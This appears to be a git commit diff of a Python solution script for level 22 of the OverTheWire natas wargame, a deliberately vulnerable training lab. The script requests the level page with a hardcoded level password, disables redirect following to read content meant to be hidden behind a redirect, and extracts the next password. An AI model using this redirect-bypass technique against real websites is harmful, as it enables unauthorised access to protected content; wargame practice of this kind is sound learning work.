f70fb777cca9ee819b49ac3034b4f2cf01f5622f
Taldgan <bananaphone993@live.com>
2020-03-16 08:41:20 -0700

    natas 22 solved

--- natas/scripts/natas22solution.py
+++ natas/scripts/natas22solution.py
@@ -5,7 +5,8 @@ def get_pass():
     auth = HTTPBasicAuth('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
     param = {'revelio':'1'}
     cook = {'PHPSESSID':'a'}
-    r = requests.get('http://natas22.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook)
-    print(r.text)
+    r = requests.get('http://natas22.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook, allow_redirects=False)
+    index = r.text.find('Password: ') + 10
+    print(r.text[index:index+32])
 if __name__ == '__main__':
     get_pass()
